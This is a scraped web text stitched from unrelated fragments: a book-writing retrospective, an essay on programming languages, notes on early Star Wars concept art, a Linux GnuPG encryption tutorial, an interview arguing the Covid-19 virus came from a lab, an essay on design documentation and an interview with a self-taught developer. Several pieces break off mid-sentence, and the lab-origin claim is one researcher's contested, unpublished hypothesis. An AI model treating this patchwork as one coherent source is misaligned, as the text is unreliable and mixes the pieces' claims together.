src="https://www.mikenikles.com/blog-posts/2020-07-03-how-i-wrote-214-pages-for-a-web-development-book-with-19-pull-requests-in-3-months/1.jpg"></picture></p> <p>37 books sold with no advertising other than posting on my Twitter account (500 followers) and LinkedIn. Given the incredible feedback I received from reviewers, I am confident I will reach a wider audience once the 37 readers wrap up the book and hopefully provide some feedback on Twitter to help promote the book.</p> <p>Estimates from reviewers vary between 30 to 50 hours to finish the book, depending on their level of experience in web development. I’m keen to keep an eye on what happens over the next few weeks and months.</p> <h2>Final thoughts</h2> <p>Writing Cloud Native Web Development was an incredibly fun project. I learned a lot about writing, publishing, EPUB (it’s basically HTML!), marketing, and what it means to be dilligent and stick to a strict schedule.</p> <p>Would I do it again? Possibly, but not in 2020 :-).</p> <p>Please head over to the <a href="https://www.mikenikles.com/cloud-native-web-development">book’s page</a> and get yourself a copy!</p> <p>👋</p></div></div>]]>

              <h2><a name="h.vq1i2tq8whe6"></a><span>A whole lot
                  of languages going on</span></h2>
              <p><span>From that late 1970’s through the early
                  1990’s I had the need to program in a lot of different
                  languages. At first I had no language tools, and programmed my
                  6502 Atari with opcodes. Then there were the “standard”
                  languages: Basic, Pascal, Fortran, Assembly (8086, 6502,
                  PDP-11, 360, 68000, TMS320), SQL, C, C++. There were the batch
                  languages: Batch, Bourne, Bash, Korn, C-Shell, Rexx. Then
                  there were application-specific command languages that seemed
                  to go along with every new program that was released.
                  &nbsp;That was far too many languages for me. Being of limited
                  intellect, I felt that each time I had to master a new
                  language I would have to give up mastery of some old language.</span></p>

                          languages is still a problem today, in my opinion, and
                          it’s a theme to which I’ll return.</span></p>
                      
                      <p><span>Take, for a recent example, the
                          current widespread use of templating languages in the
                          web space. There are several server-side templating
                          languages people apply to their HTML code, and then
                          there are several server-side templating languages. So
                          already there are two problems: 1) several templating
                          languages to choose from (crazy), and 2) the HTML
                          templating languages are different than the CSS
                          templating languages (super-crazy). The issue is even
                          worse because most web developers don’t yet realize
                          that they can optimize their systems by delivering
                          slightly different javascript code to their
                          slightly-different clients, but when they realize it,
                          guess what, they’ll probably create yet another
                          server-side templating language just for JS files, and
                          naturally it will resemble neither the HTML nor the
                          CSS templating languages (crazy crazy crazy).</span></p>
                      
                      <p><span>To make matters worse, every
                          developer that wants to prove himself will at some
                          point develop a new language. Is it just as capable of
                          implementing a turing engine as all the other
                          languages that already exist? Yes. Is it better than
                          the existing language it’s meant to replace? Maybe. Is
                          it so much better that the rest of us should throw out
                          our expertise to learn the new language? Almost
                          certainly not.</span></p>

              <h2><a name="h.k1btxapqspg"></a><span>C is great,
                  but not for everybody</span></h2>
              <p><span>My favorite language was C, due to it’s small
                  syntax (very few keywords), generality, and high performance.
                  C was powerful and fun. If you wanted to get serious work
                  done, you used C. (Curiously, even most of those
                  command-specific and batch languages I mentioned above were
                  themselves implemented in C.)</span></p>
              
              <p><span>Most importantly, C was where the good and
                  high-paying jobs were, which is why people wanted to learn C
                  and why they showed up for an adult-education class that I was
                  teaching. The C language had a reputation for being difficult,
                  and so I expected it to be difficult to teach. But as we
                  stepped through the basic syntax elements it wasn’t hard at
                  all, almost everyone was following right along very quickly.
                  Until...</span></p>
              
              <p><span>At one point the majority of the class, who
                  until then was learning to program surprisingly quickly,
                  stopped clicking with what I was teaching. Certain topics just
                  left them completely confused: e.g., pointers (incrementing
                  and dereferencing), sizes of datum and data, allocation and
                  freeing, stack use... It took a while, but eventually I
                  realized where the problem lay: For a large segment of the
                  students, maybe most, any aspect of C that involved
                  understanding how data was arranged in computer memory just
                  led to total confusion. Maybe I was teaching it wrong? Maybe a
                  fundamental a background in opcodes and assembly and even
                  circuit boards is needed to really “get it”? Maybe it’s just
                  an unnatural concept that doesn’t mesh with most humans
                  brains? In any case, I started to think that most of these
                  students were never going to be top-notch C programmers, at
                  least not with me as the teacher.</span></p>

An ironic decision as we'll see later, when outside influence forced him to change his mind back.</p><p>He also wrote “see book cover”, although we have no idea which book is referring to. He clearly had something very specific in mind since the note is right next to that drawing (and so the sci-fi book cover trawling begins anew). This along with the <em>Stainless Steel Rat</em> reference reaffirms Lucas's approach to developing ideas and visual starting points, by trawling every science fiction book and magazine he could get his hands on.</p><p>We'll remember this bit later on, but for now, let's get introduced to our cast.</p><p>About a year and a half into his space fantasy screenplay, George Lucas hired one of the first creatives to help flesh out the world of <em>Adventures of the Luke Starkiller</em>. The studios didn't get what Lucas was selling, and his best bid was to jump start their imaginations with some visuals.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_3_1456074203728_22957"><div>

<p>Some tools are built into the operating system, while others must be installed. </p>
<p>Thus, lets see up next how to encrypt and decrypt files with a password in Linux.</p>
<h2 id="Encrypt-files-with-a-GUI"><a href="#Encrypt-files-with-a-GUI" title="Encrypt files with a GUI"></a>Encrypt files with a GUI</h2><p>Another useful tip on how to encrypt files with a password in Linux is to use a graphical tool that features a Nautilus file manager. </p>
<p>You can encrypt/decrypt files with a right-click on the target file.<br>Type the command  <code>sudo apt-get install seahorse-nautilus -y</code>, and after the installation process is done, restart Nautilus with the command nautilus -q. </p>
<p>From this point on, all you have to do is right click on the file you want encrypted and click the encrypt function.</p>
<p><img src="https://bsdnerds.org/images/nautilus-encrypt-gui.png" alt="encrypt files with gui using nautilus on linux"></p><h2 id="Encrypt-files-with-gnupg"><a href="#Encrypt-files-with-gnupg" title="Encrypt files with gnupg"></a>Encrypt files with gnupg</h2><p>GnuPG represents a tool useful for securing both communication and data storage. It is great for encrypting files/folders and for designing digital signatures. This tool comes with a professional key management option.</p>
<h3 id="Install-gnupg"><a href="#Install-gnupg" title="Install gnupg"></a>Install gnupg</h3><p>GnuPG can be installed in <strong>Debian, Ubuntu or Mint Linux</strong> with the following command: </p>
<pre><code>$ sudo apt-get install gnupg</code></pre><p>For <strong>Red hat</strong> or <strong>CentOS Linux</strong> you will have to use the command - </p>
<pre><code>$ sudo yum install gnupg</code></pre><p>For <strong>Fedora Linux</strong> you will have to use the command -<br>    $ sudo dnf install gnupg</p>
<p>For <strong>Arch Linux</strong> you will have to use the command - </p>
<pre><code>$ sudo pacman -S gnupg</code></pre><p>For <strong>OpenSUSE Linux</strong> you will have to use the command - </p>
<pre><code>$ sudo zypper install gpg2</code></pre><p>For <strong>FreeBSD unix</strong> you will have to use the command for the port -</p>
<pre><code># cd /usr/ports/security/gnupg/ &amp;&amp; make install clean</code></pre><p>and add the package via </p>
<pre><code># pkg install gnupg.</code></pre><p>For <strong>OpenBSD unix</strong> you will have to use the command -</p>
<pre><code>$ doas pkg_add gnupg</code></pre><h3 id="How-to-use-GPG"><a href="#How-to-use-GPG" title="How to use GPG"></a>How to use GPG</h3><p>After this, you can start encrypting your data in either Linux or Unix, with the aid of the following commands:<br>    A single file requires the command -</p>
<pre><code>$ gpg -c filename</code></pre><p>    A myfinancial.info.txt file requires the command -</p>
<pre><code>$ gpg -c myfinancial.info.txt</code></pre><p>On the other hand, to decrypt data in Linux or Unix systems, you can use one of the following commands:</p>
<pre><code>$ gpg myfinancial.info.txt.gpg
$ gpg -d myfinancial.info.txt.gpg
$ gpg --decrypt myfinancial.info.txt.gpg</code></pre><h2 id="Hide-files-with-File-Manager"><a href="#Hide-files-with-File-Manager" title="Hide files with File Manager"></a>Hide files with File Manager</h2><p>Even though this is not actually an encryption process, it is quite helpful for hiding important data in plain sight. </p>
<p>Thus, you can open your distributions default file manager in the location you are planning to hide a file. Right-click an empty spot and select New Folder. Name the folder starting with a period (i.e if you plan to name it <code>data</code>, you should type <code>.data</code>). </p>

            <h2>NYHET</h2>



        

        

            <h3 itemprop="description">
            The well-known Norwegian virologist Birger Sørensen and his colleagues have examined the corona virus. They believe it has certain properties which would not evolve naturally. These conclusions are politically controversial, but in this interview he shares the findings behind the headlines.
            </h3>

    

</div>


                <div><p>“I understand that this is controversial, but the public has a legitimate need to know, and it is important that it is possible to freely discuss alternate hypotheses on how the virus originated” Birger Sørensen starts to explain when Minerva visits him in his office one morning in Oslo.</p><p>Despite the explosiveness of his statements and research, Sørensen remains calm and collected.</p><p>Sørensen has been a point of controversy ever since former MI6 director Richard Dearlove cited a yet to be published article by Sørensen and his colleagues in an interview with The Daily Telegraph. The article claims that the virus that causes Covid-19 most likely has not emerged naturally.</p><p>“It’s a shame that there has already been so much talk about this, because I have yet to publish the article where I put forward my analysis”, Sørensen says in the form of an exasperated sigh.</p><p>Together with his colleagues, Angus Dalgleish and Andres Susrud have authored an article that looks into the most plausible explanations regarding the origins of the novel coronavirus. The article builds upon an already published article in the Quarterly Review of Biophysics that describes newly discovered properties in the virus spike protein. The authors are still in dialogue with scientific journals regarding an upcoming publication of the article.</p><p>News outlets are thus confronted with a difficult question: Are the findings and arguments Sørensen and his colleagues put forward of a sufficiently high quality to be presented and discussed in the public sphere? Sørensen explains that they in their dialogue with scientific journals are encountering a certain reluctance to publishing the article – without, however, proper scientific objections. Minerva has read a draft of the article, and has after an overall assessment decided that the findings and arguments do deserve public debate, and that this discussion cannot depend entirely on the publication process of scientific journals.</p><p>In this interview with Minerva, Sørensen therefore puts forward his hypothesis on why it is highly unlikely that the coronavirus emerged naturally.</p><p>On May 18th, WHO decided to conduct an inquiry into the coronavirus epidemic in China. Sørensen believes that it is important that this inquiry looks into new and alternate explanations for how the virus originated, beyond the already well-known suggestion that the virus originated in the Wuhan Seafood Market.</p><p>“There are very few who still believe that the epidemic started there, so as of today we have no good answers on how the epidemic started. Then we must also dare to look at more controversial, alternative explanations for the origin,” Sørensen says.</p><p>Birger Sørensen and one of his co-authors, Angus Dalgleish, are already known as HIV researchers par excellence.</p><p>In 2008, Sørensen’s work came to international <a href="https://www.dagensperspektiv.no/2008/norsk-firma-med-hiv-gjennombrudd">attention</a> when he launched a new immunotherapy for HIV. <a href="https://www.nature.com/search?author=%22Angus%20G.+Dalgleish%22">Angus Dalgleish</a> is the professor at St. George’s Medical School in London who became world famous in 1984 after having <a href="https://www.nature.com/articles/312763a0">discovered</a> a novel receptor that the HIV virus uses to enter human cells.</p><p>The purpose of the work Sørensen and his colleagues have done on the novel coronavirus, has been to produce a vaccine. And they have taken their experience in trialling HIV vaccines with them to analyse the coronavirus more thoroughly, in order to make a vaccine that can protect against Covid-19 without major side effects.</p><h2>Exceptionally well adjusted</h2><p>“The difference between our approach and other vaccine manufacturers is that we have a chemistry background, and we analyse the virus in detail as if we were making a drug,” Sørensen starts to explain.</p><p>“Biology is also chemistry, so by considering the virus from a chemistry perspective, we carry out more detailed analysis, zooming in on certain components.”</p><p>Sørensen takes us through the basic elements of their approach:</p><p>“The first thing you need to establish is which parts of the virus are changing, and which parts are stable. If you want to make a vaccine that lasts, you must stimulate the immune system to react against those parts of the virus that are constant, otherwise the effect will disappear and, in the worst-case scenario, lead to increased illness.</p><p>“Once we know this, we can try to make a vaccine. Where we differ is that we are trying to make a vaccine that uses elements that have as little in common with the body’s natural components as possible, so that the immune system is taught to recognise exactly what the vaccine should protect against”, Sørensen elaborates.</p><p>Sørensen believes this is an important insight which will prevent the immune system from being falsely stimulated in a way that could lead the vaccine to create too many dangerous side effects in the vaccinated person.</p><p>“When we have not succeeded in creating an HIV vaccine, despite the enormous efforts put into that endeavour for the past 30 years, it is because we haven’t understood this,” Sørensen continues.</p><p>He believes that there has not been enough interaction between the part of the pharmaceutical industry that makes HIV medicines and the part that runs the vaccine research. As a consequence, the knowledge you need to make a successful vaccine against HIV in the big pharmaceutical companies has not been adequately exploited by the big, international HIV preventing vaccine studies that have been carried out.”</p><p>Asked about what significance his approached has had when he has analyzed the coronavirus, Sørensen explains:</p><p>“We have examined which components of the virus are especially well suited to attach themselves to cells in humans. And we have done this by comparing the properties of the virus with human genetics. What we found was that this virus was exceptionally well adjusted to infect humans.”</p><p>He pauses for a second.</p><p>“So well that it was suspicious,” he adds.</p><h2>Perfected to infect humans</h2><p>It is already known that the novel coronavirus, like the virus that caused the SARS epidemic in Southeast Asia in 2002-2003, could attach itself to the ACE-2 receptors in the lower respiratory tract.</p><p>“But what we have discovered is that there are properties in this new virus which enables it to use an additional receptor, and create a binding to human cells in the upper respiratory tract and the intestines which is strong enough to produce an infection,” Sørensen elaborates.</p><p>Sørensen says that it is the use of this additional receptor that most likely results in a different illness in Covid-19 patients than the one resulting from SARS.</p><p>“This is what enables the virus to transmit to a greater degree between humans, without the virus having attached itself to the ACE-2 receptors in the lower respiratory tract, where it causes deep pneumonia.</p><p>“That is also why so many of the Covid-19 patients have mild symptoms at the start of the illness, and are contagious before they develop severe symptoms,” he adds.</p><p>It might also explain why some people are ‘super spreaders’ without being ill themselves, Sørensen says.</p><p>In the already published article Sørensen and his colleagues Angus Dalgleish and Andres Susrud describe what they claim is curious about the spike protein of the coronavirus, which makes it especially well suited to infect humans. These findings are the foundation for the hypothesis Sørensen and his colleagues develop in the new article, where they claim that the virus is not natural in origin.</p><div id="factbox-361864">
    <div>
        
        <h2>FACT BOX – Spike Protein</h2>
        <p>A spike protein is a part of the virus attached to the surface of the virus. The spike protein is used by the virus when it enters cells, enabling it to stick in humans. The properties of the spike determines which receptors a virus can utilise and thus which cells the virus can enter to create illness.</p>
        
    </div>
    
</div><p>“There are several factors that point towards this,” says Sørensen. “Firstly, this part of the virus is very stable; it mutates very little. That points to this virus as a fully developed, almost perfected virus for infecting humans.</p><p>“Secondly, this indicates that the structure of the virus cannot have evolved naturally. When we compare the novel coronavirus with the one that caused SARS, we see that there are altogether six inserts in this virus that stand out compared to other known SARS viruses,” he goes on explaining.</p><p>Sørensen says that several of these changes in the virus are unique, and that they do not exist in other known SARS coronaviruses.</p><p>“Four of these six changes have the property that they are suited to infect humans. This kind of aggregation of a type of property can be done simply in a laboratory, and helps to substantiate such an origin,” Sørensen points out.</p><h2>An artificially created virus</h2><p>Asked about whether this implies that the virus is not natural, Sørensen goes on to explain the laboratory process that leads to the creation of new viruses.</p><p>“In a sense it is natural. But the natural processes have most likely been accelerated in a laboratory,” he explains. “It’s also possible for a virus to attain these properties in nature, but it’s not likely. If the mutations had happened in nature, we would have most likely seen that the virus had attracted other properties through mutations, not just properties that help the virus to attach itself to human cells.”</p><p>Sørensen vividly explains this argument:</p><p>“Imagine that you have cultivated a billion coronaviruses you have gathered from nature, then you take this mass of viruses and inject them into a human cell culture from for example the upper respiratory tract. As a result, a few of these viruses will change in order to better attach themselves to …</p></div></section></article></div>

<p>Only loosely related to what it should do.</p>


<p>Code says what it does. That's important for the computer, because code is the way that we ask the computer to do something. It's OK for humans, as long as we never have to modify or debug the code. As soon as we do, we have a problem. Fundamentally, debugging is an exercise in changing what a program does to match what it should do. It requires us to know what a program should do, which isn't captured in the code. Sometimes that's easy: What it does is crash, what it should do is <em>not crash</em>. Outside those trivial cases, discovering intent is harder.</p>

<p>Debugging when <em>should do</em> is subtle, such as when building distributed systems protocols, is especially difficult. In our <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a> paper, we say:</p>

<blockquote><p>Our code reviews, simworld tests, and design meetings frequently referred back to the TLA+ models of our protocols to resolve ambiguities in Java code or written communication.</p></blockquote>

<p>The problem is that the implementation (in Physalia's case the Java code) is both an imperfect implementation of the protocol, and an overly-specific implementation of the protocol. It's overly-specific because it needs to be fully specified. Computers demand that, and no less, while the protocol itself has some leeway and wiggle room. It's also overly-specific because it has to address things like low-level performance concerns that the specification can't be bothered with.</p>

<p><em>Are those values in an ArrayList because order is actually important, or because O(1) random seeks are important, or some other reason? Was it just the easiest thing to write? What happens when I change it?</em></p>

<p>Business logic code, while lacking the cachet of distributed protocols, have even more of these kinds of problems. Code both over-specifies the business logic, and specifies it inaccurately. I was prompted to write this by a tweet from @mcclure111 where she hits the nail on the head:</p>

<blockquote data-conversation="none" data-dnt="true"><p lang="en" dir="ltr">Since most software doesn't have a formal spec, most software "is what it does", there's an incredible pressure to respect authorial intent when editing someone else's code. You don't know which quirks are load-bearing.</p>— mcc 🏳️‍⚧️🏳️‍🌈 (@mcclure111) <a href="https://twitter.com/mcclure111/status/1274422600236765186?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>




<p>This is a major problem with code: <em>You don't know which quirks are load-bearing.</em> You may remember, or be able to guess, or be able to puzzle it out from first principles, or not care, but all of those things are slow and error-prone. What can we do about it?</p>

<p><strong>Design Documentation</strong></p>

<p>Documentation is uncool. Most software engineers seem to come out of school thinking that documentation is below them (<em>tech writer work</em>), or some weird thing their SE professor talked about that is as archaic as Fortran. Part of this is understandable. My own software engineering courses emphasized painstakingly documenting the implementation in UML. No other mention of documentation was made. Re-writing software in UML helps basically nobody. I finished my degree thinking that documentation was unnecessary busywork. Even the <a href="https://agilemanifesto.org/">Agile Manifesto</a> agreed with me<sup><a href="#foot1">1</a></sup>:</p>

<blockquote><p>Working software over comprehensive documentation</p></blockquote>

<p>What I discovered later was that design documentation, encoding the intent and decisions made during developing a system, helps teams be successful in the short term, and people be successful in the long term. Freed from fitting everything in my head, emboldened by the confidence that I could rediscover forgotten facts later, I could move faster. The same applies to teams.</p>

<p>One thing I see successful teams doing is documenting not only the <em>what</em> and <em>why</em> behind their designs, but the <em>how they decided</em>. When it comes time to make changes to the system—either for debugging or in response to changing requirements—these documents are invaluable. It's hard to decide whether its safe to change something, when you don't know why it's like that in the first place. The record of how you decided is important because you are a flawed human, and understanding how you came to a decision is useful to know when that decisions seems strange, or surprising.</p>

<p>This documentation process doesn't have to be heavyweight. You don't have to draw painstaking <a href="https://en.wikipedia.org/wiki/Entity%E2%80%93relationship_model">ER diagrams</a> unless you thing they are helpful. You should probably ignore UML entirely. Instead, describe the system in prose as clearly as succinctly as you can. One place to start is by building an RFC template for your team, potentially inspired by one that you find on the web. <a href="https://static1.squarespace.com/static/56ab961ecbced617ccd2461e/t/5d792e5a4dac4074658ce64b/1568222810968/Squarespace+RFC+Template.pdf">SquareSpace</a>'s template seems reasonable. Some designs will fit well into that RFC format, other's won't. Prefer narrative writing where you can.</p>

<p>Then, keep the documents. Store them somewhere safe. Soak them in vinegar <a href="https://www.almanac.com/content/home-remedies-cough-relief">and tie them around your chest</a>. You're going to want to make sure that the people who need to maintain the system can find them. As they are spelunking through history, help them feel more like a library visitor and less like Lara Croft.</p>

<p>I'm not advocating for Big Design Up Front. Many of the most important things we learn about a project we learn during the implementation. Some of the most important things we learn years after the implementation is complete. Design documentation isn't a static one-time ahead-of-time deliverable, but an ongoing process. Most importantly, design documentation is not a commitment to bad ideas. If it's wrong, fix it and move forward. Documentation is not a deal with the devil.</p>

<p><strong>Comments</strong></p>

<p>Few topics invite a programmer flame war like comments. We're told that comments are silly, or childish, or make it hard to show how manly you are in writing that convoluted mess of code. If it was hard to write, it should be hard to read. After all, you're the James Joyce of code.</p>

<p>That silliness aside, back to @mcclure111's thread:</p>

<blockquote data-conversation="none" data-dnt="true"><p lang="en" dir="ltr">This means comments that *reveal* authorial intent are valuable, and comments that reveal *there was no authorial intent* are even more valuable. Without those hints, you're left editing superstitiously, preserving quirks even when you don't know why. <a href="https://t.co/YhvWnXjp9i">https://t.co/YhvWnXjp9i</a></p>— mcc 🏳️‍⚧️🏳️‍🌈 (@mcclure111) <a href="https://twitter.com/mcclure111/status/1274422825831596039?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>




<p>Comments allow us to encode <em>authorial intent</em> into our code in a way that programming languages don't always. Types, traits, interfaces, and variable names do put intent into code, but not completely (I see you, type system maximalists). These same things allow us to communicate a lack of intent—consider <a href="https://docs.oracle.com/javase/8/docs/api/java/util/RandomAccess.html">RandomAccess</a> vs <a href="https://docs.oracle.com/javase/8/docs/api/java/util/ArrayList.html">ArrayList</a>—but are also incomplete. Well-commented code should make the intent of the author clear, especially in cases where that intent is either lost in the translation to code, or where implementation constraints hide the intent of the design. Code comments that link back to design documents are especially useful.</p>

<p>Some languages need comments more than others. Some, like SQL, I find to nearly always obscure the intent of the design behind implementation details.</p>

<p><strong>Formal Specification</strong></p>

<p>In <a href="https://cacm.acm.org/magazines/2015/4/184705-who-builds-a-house-without-drawing-blueprints/fulltext">Who Builds a House Without Drawing Blueprints?</a> Leslie Lamport writes:</p>

<blockquote><p>The need for specifications follows from two observations. The first is that it is a good idea to think about what we are going to do before doing it, and as the cartoonist Guindon wrote: "Writing is nature's way of letting you know how sloppy your thinking is."</p>

<p>The second observation is that to write a good program, we need to think above the code level.</p></blockquote>

<p>I've found that specification, from informal specification with narrative writing to formal specification with TLA+, makes writing programs faster and helps reduce mistakes. As much as I like that article, I think Lamport misses a key part of the value of formal specification: it's a great communication tool. In developing some of the trickiest systems I've built, I've found that heavily-commented formal specifications are fantastically useful documentation. Specification languages are all about <em>intent</em>, and some make it easy to clearly separate intent from implementation.</p>

<p>Again, from our <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a> paper:</p>

<blockquote><p>We use TLA+ extensively at Amazon, and it proved exceptionally useful in the development of Physalia.  Our team used TLA+ in three ways: writing specifications of our protocols to check that we understand them deeply, model checking specifications against correctness and liveness properties using the TLC model checker, and writing extensively commented TLA+ code to serve as the documentation of our distributed protocols. While all three of these uses added value, TLA+’s role as a sort of automatically tested (via TLC),and extremely precise, format for protocol documentation was perhaps the most useful.</p></blockquote>

<p>Formal specifications make excellent documentation. Like design docs, they aren't immutable artifacts, but a reflection of what we have learned about the problem.</p>

<p><strong> Conclusion </strong></p>

<p>Building long-lasting, maintainable, systems requires not only communicating with computers, but also communicating in space with other people, and in time with our future selves. Communicating, recording, and indexing the intent behind our designs is an important part of that picture. Make time for it, or regret it later.</p>

                        <p>Mariano used to make $2,500 a year in Argentina 10 years ago. He now makes $210,000 as a self-taught developer working remotely. That's 84 * $2,500.</p><p>Mariano shares his story of learning to code for free, working his way out of poverty and getting lucrative remote jobs from Argentina. I've not been this excited about an article for a long time. Enjoy!</p><h2 id="hey-can-you-introduce-yourself">Hey, can you introduce yourself? </h2><p>Sure! My name is <a href="https://twitter.com/geekmz">Mariano Zorrilla</a>, I’m 31 years old and a Tech Lead at Venmo/PayPal. Before that I was a Head of Mobile at HighSide (a startup). I was raised in a small city called Rio Ceballos in Cordoba province in Argentina. The population is around 20,000 people. There are only medium to low income families. Every single store is locally owned (no retail stores, no big names, no chains, no fast food companies). </p><p>When I was a kid we had an income of around $400 dollars a month for the entire family (6 in total) and lots of debt. I went to a local elementary school and high school. Due to our family income, I couldn’t go to college. Even though it's free in my country I was living 30 miles (50km) away from any college. I couldn't afford paying the bus ticket every day.</p><h2 id="how-much-do-you-earn-roughly-as-a-software-engineer">How much do you earn roughly as a software engineer? </h2><p>Right now I make $210,000 a year. I always look into ways to increase and diversifying my income. Because I live in Argentina, I can have a good life spending around $2k dollars a month. Then I put all my money into savings accounts for future big investments.</p><h2 id="can-you-tell-us-about-the-economic-situation-in-argentina">Can you tell us about the economic situation in Argentina?</h2><p>In Argentina, the poverty rate was around 35% when I started coding and now sits at around 50% of the population. Only 40% of the active population is currently working. Apart from the private sector, the rest work for the public sector or don’t work at all. They have a small monthly income of $150 dollars a month from government benefits.</p><h2 id="why-did-you-learn-to-code">Why did you learn to code? </h2><p>All those things made me keep looking forward to becoming a mobile developer. I was lucky enough to have friend next door who was the only hardware engineer in the entire city. He at least had an idea of what “coding” was about. I chatted with him to start the process (and now I bring him to work with me at Venmo/PayPal).</p><p>I started working at the age of 14 helping my mom. My first bucks came when I was 17 years old responding to phone calls on a local FM Radio and TV Station 1 hour a day. After 3 months I got something like $45.</p><p>Getting better jobs was hard because the “best” ones were in the city close by. Paying for the bus was already taking a big part of my salary. So I managed to get work at a call center (Customer Phone Care). I earned around $200 to $250 a month so enough for me to travel, pay for food and that’s it. &nbsp;I stayed that way until I turned 20 years old and I was really depressed with no future ahead of me. </p><p>Every day I had 3 hours in total going to and back from work on a bus to “think” about things I could do to have a better income. By then, the iPhone was a thing and I had an old 2004 smartphone (Nokia). By then it was 2009 &nbsp;but I could run apps and I found that amazing! It was a pocket PC for me.</p><p>In one of those trips I read an article about Google doing a phone. People will be able to do apps! So, I got this crazy idea of doing apps. I didn’t even have a PC at home, but at least I got my first goal. &nbsp;Due to my low income, I couldn’t have a credit card, so I decided to buy a cheap netbook (those 7” to 10” &nbsp;laptops). </p><p>I split the laptop cost into six small payments as the whole cost was much as my whole month's salary. &nbsp;That small machine allowed me to download Eclipse and Photoshop. So I could start learning every time I had free time out of work. The journey to learn how to code started there aged 21. Again, I was saving to get my first Android device (the Motorola Milestone/Droid).</p><!--kg-card-begin: markdown--><p><a href="https://gum.co/XUBNd"><img src="https://www.nocsdegree.com/content/images/2020/06/imposter-syndrome-with-image-collage-2--1-.jpg" alt="imposter-syndrome-with-image-collage-2--1-"></a></p>
<!--kg-card-end: markdown--><h2 id="how-did-you-learn-to-code-without-a-cs-degree">How did you learn to code without a CS degree? </h2><p>I got a JAVA SE 6 book (2.300 pages) which I didn’t understand even a bit of the first time… and the same for my second time. I tried to follow a course about Android for 3 months that I also didn’t understand much. But I kept in contact with the teacher to “code professionally”. I tried to work with him for a few months but I couldn’t pay for my bus ticket and stopped doing it. </p><p>I spent almost a year unemployed doing some coding at home. I was testing what I was doing wrong but I get so frustrated and sometimes depressed. I managed to make a small FM Radio app getting the URL of a local station from their website. The owners talked with me to make it “look good” and that allowed me to improve my code. </p><p>During all that time and year I tried to do job interviews. I got so many non stop “Nos” from everyone because I didn’t have a CS Degree and didn’t have any industry experience. I spent 3 months doing a super simple app with little functionality. But I learned all the process of posting the app over the Android Market (yep, the old name of the Play Store). I didn’t get any money from that, but I started getting my name around the city and ended up trying to get clients.</p><p>After a couple of months of unemployment I got back to a call center to get a bit of money to pay the bills. This time I spent all my free time coding anything I could think of. I was watching blog post tutorials and understanding MCV and MVP architecture. Plus, learning Java from top to bottom. </p><p>I quit after a year and managed to get a client who needed Android, iOS and a website. I knew nothing about iOS and websites, but I took the challenge. I asked him if he could lend me his Mac Mini to code in iOS as I needed Xcode to run that. &nbsp;I saved up to get a cheap iPod Touch to test the app.</p><p>I searched on every blog possible how to parse JSON, how to do API connections and play audio. I ended up with a basic app in 2 weeks. In that time I also re-did the first app that originally took me 3 months in 2 days. I used all the knowledge I got after 1 year &nbsp;of non-stop practicing and practicing. </p><p>For websites I learned PHP, MySQL, some DevOps skills and AWS. I got a WordPress website running with a basic endpoint to fetch news. I also did some freelance work to get a few extra dollars, but I mostly did UI/UX for mobile apps.</p><h2 id="moving-to-buenos-aires">Moving to Buenos Aires</h2><p>That client lasted for 8 months. When the money was running out, I saw an Android job opportunity on Twitter and decided to give it a try. It was 400 miles (650km) away from where I was; from a small city to the biggest in the entire country, Buenos Aires. It was a mobile game company. Because I love to do animations, I demonstrated this to them, got hired and moved to Buenos Aires. &nbsp;I made a $12k annual salary which sounded incredible for me at the time.</p><p>I learned a lot about how to use Git, different mobile architectures, working with a large team and making a large project with millions of users. Like before, I spent all my free time learning new coding skills but now with a much larger scope. (mostly from blogs, youtube videos and github open source projects.) Then, thanks to my English skills I managed to get jobs from the United States.</p><h3 id="prepare-for-technical-interviews-with-algo-expert-nocs-gets-you-15-off-">Prepare for technical interviews with <a href="https://www.algoexpert.io/nocs">Algo Expert</a>- "NOCS" gets you 15% off. </h3><h2 id="getting-remote-jobs-as-a-developer">Getting remote jobs as a developer</h2><p>I first landed at a young startup which was a terrible experience but I get to know San Francisco for a month. That was my dream since I started watching all the events and companies being over there). Then I moved to some remote software factories for a while making $24k a year. Then, I became a senior contractor developer for a huge mobile game company in San Francisco. This increased my income to $40k a year.</p><p>My last two &nbsp;jobs were also remote: I was Head of Mobile for a NYC Startup company where I fixed their native client apps. I managed to talk with the CEO and CTO to check technologies and use Flutter to have 1 code base. I was still in Argentina while making $60k a year in that position. I lasted 1 year there with so many challenges. I was learning complex algorithms and scaling a huge chat app. </p><p>Then I got a phone call from my previous contractor about a huge opportunity. It was at Venmo/PayPal making $160k a year as a Tech Lead. That was thanks to all the management level knowledge I got from previous jobs. I was not only involved with the code, but the product itself. Plus, I have extra consultant/freelance work for another $50k a year.</p><h2 id="what-advice-do-you-have-for-someone-without-a-cs-degree-who-wants-to-get-their-first-programming-job">What advice do you have for someone without a CS degree who wants to get their first programming job? </h2><p>Don’t work hard (too hard), work smart! You could learn many things that took me around 5 years in way less time. Because I wasn't looking for the right/correct information. </p><p>Learn about good practices, solid OOP knowledge and clean architecture. Use social media, github and online platforms like codepen to showcase your work. &nbsp;Make a portfolio and involve yourself in your local development community. Do a LOT of networking and gain the trust of your peers. </p><p>You’ll eventually become a Sr developer, but that takes years no matter what you do. So do it in a smart way to get the best opportunities for your future.</p><!--kg-card-begin: markdown--><p><a href="http://nocsok.com/"><img src="https://www.nocsdegree.com/content/images/2020/06/No-CS-OK-screenshot-1.jpg" alt="No-CS-OK-screenshot-1"></a></p>
<!--kg-card-end: markdown--><h2 id="what-are-some-tips-for-getting-remote-freelance-contracts">What are some tips for getting remote freelance contracts? </h2><p>Again, make yourself known around the community. Get a good portfolio of examples. Showcase your “developer powers” by doing something out of the ordinary. Participate in hackathons and go to Meetups events. Eventually, with a good network and people knowing your hard work, dedication and code quality, those opportunities show up!</p><h2 id="what-tips-do-you-have-for-people-wanting-to-code">What tips do you have for people wanting to code? &nbsp;</h2><p>It’s a challenge, it is not easy. So don’t worry if you don’t know lots of math. You can spend a career without knowing complex algorithms. Is going to be frustrating many &nbsp;times but don’t take that in a bad way. It is a normal process for learning how to code. Take &nbsp;a “video game” perspective: That complex UI with API calls and lists of items are the main Enemy. Your code editor and brain are your weapons. Once you defeat the Enemy …</p></div></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="mainContentOfPage">
		
